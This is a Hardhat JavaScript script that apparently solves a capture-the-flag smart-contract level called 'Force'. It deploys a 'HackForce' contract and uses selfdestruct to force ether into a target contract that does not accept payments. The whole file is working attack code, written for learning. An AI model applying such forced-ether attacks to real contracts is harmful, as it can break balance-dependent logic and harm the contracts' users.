// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Force";
  const contractAddress = "0xFc02Aa5eaFB74C1F92ed519DF3b97283CBc66B5E";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  const [deployer, hacker, tester] = await hre.ethers.getSigners();
  console.log(`🤓 Hacker address:\n ${deployer.address} \n`);

  // 📕 Deploy the contract that will execute the hack
  const HackForce = await ethers.getContractFactory("HackForce", deployer);
  const hackForce = await HackForce.connect(deployer).deploy(contract.address);
  await hackForce.deployed();

  // 🗣 Logging status
  let forceBalance = await ethers.provider.getBalance(contract.address);
  console.log("💰 Initial Force.sol balance:", forceBalance);
  console.log(
    "💰 Hacker balance:",
    await ethers.provider.getBalance(deployer.address)
  );

  // 👿 Hacking the contract
  // 📖 https://docs.soliditylang.org/en/v0.8.13/introduction-to-smart-contracts.html#deactivate-and-self-destruct
  const txTransfer = await hackForce.selfDestructEther({
    value: ethers.utils.parseEther("0.000001"),
  });
  await txTransfer.wait((confirms = 1));

  // 🗣 Logging status
  forceBalance = await ethers.provider.getBalance(contract.address);
  console.log("💰 Force.sol balance:", forceBalance);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
